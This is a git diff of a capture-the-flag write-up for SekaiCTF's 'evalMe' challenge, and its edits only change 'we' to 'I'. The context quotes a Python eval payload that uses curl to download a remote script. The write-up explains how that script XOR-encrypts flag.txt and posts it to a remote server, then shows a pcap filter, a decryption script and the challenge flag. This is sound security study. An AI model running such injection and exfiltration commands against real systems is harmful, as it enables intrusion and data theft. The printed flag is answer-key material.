@@ -13,7 +13,7 @@ b'__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o 
 ```
 
 ### Extract.sh
-Downloading the extract.sh to our VM (`curl -sL https://shorturl.at/fgjvU -o extract.sh`), we get the following script:
+Downloading the extract.sh to our VM (`curl -sL https://shorturl.at/fgjvU -o extract.sh`), I get the following script:
 ```
 #!/bin/bash
 
@@ -54,15 +54,15 @@ exit 0
 This script reads the content of `flag.txt`, encrypts it using XOR encryption with a predefined key, and then sends the encrypted data, byte by byte, to a remote server using cURL. The server URL and endpoint seem to be `http://35.196.65.151:30899/`, and the data is likely being sent in a structured JSON format as part of the POST request.
 
 ### pcap Analysis
-This is where the pcap file comes in. It contains the data sent via that POST command. So, filtering by: `ip.dst ==35.196.65.151 && http.request.method == POST`, we get 51 packets that contain the bytes that were sent as seen below:
+This is where the pcap file comes in. It contains the data sent via that POST command. So, filtering by: `ip.dst ==35.196.65.151 && http.request.method == POST`, I get 51 packets that contain the bytes that were sent as seen below:
 
 
 [![alt text]([https://github.com/triciadang/CTF/SekaiCTF/evalMe/evalMeScreenshot.jpg?raw=true])](https://github.com/triciadang/CTF/blob/main/SekaiCTF/evalMe/evalMeScreenshot.jpg)
 
-We exported all of the bytes into a txt file using Wireshark.
+I exported all of the bytes into a txt file using Wireshark.
 
 ### Decryption of the Data
-We then created a script that reversed the encryption for each byte:
+I then created a script that reversed the encryption for each byte:
 
 ```
 #!/bin/bash
@@ -95,4 +95,4 @@ DecryptedData=$(XORDecrypt "$KEY" "$EncryptedData")
 
 echo -ne "$DecryptedData"
 ```
-Running it against the exported bytes, we retrieve the flag: `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`
+Running it against the exported bytes, I retrieved the flag: `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`
